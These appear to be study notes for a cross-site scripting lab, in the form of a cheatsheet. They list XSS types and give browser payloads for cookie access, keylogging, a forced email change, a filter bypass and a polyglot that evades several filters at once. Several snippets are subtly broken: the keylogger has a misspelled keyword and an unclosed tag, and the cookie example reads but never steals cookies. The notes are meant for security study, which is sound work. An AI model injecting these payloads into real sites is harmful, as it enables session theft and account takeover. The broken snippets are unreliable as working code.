# XSS Cheatsheet
Cross-site scripting is executed in the browser on the client machine.  A simple proof of concept would look like:

## XSS Classifications
| Type | Location |
| ---- | -------- |
| Reflected | URL Paramaters |
| Stored | Database |
| DOM | Unsafe JS variables |
| Blind | Support Tickets / Emails |

Reflected XSS - URL Query parameters
Stored

```js
<script>alert('xss');</script>
```

## Session Stealing
Extract user cookies to be used for a sign in:
```js
<script>document.cookie</script>
```

## Key Logging
Capture user key presses:
```js
<script>
document.onkeypress = functio(e) {
    e.Key
}
<script>
```

## Business Logic
You may be able to access critical functions 
```js
<script>
user.updateEmail('malicious@bad.com');
</script>
```

## Bypass Techniques
Some fiters are trivial to bypass while others involve a deeper understanding of the code to exploit.

### String filters
A website can filter based on string matches such as `script`. In some cases we can evade this filter by duplicating the string.
```js
<sscriptcript>
    alert('xss');
</sscriptcript>
```

## Polygots
An attack that can bypass multiple filters in one go.
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')"'
```
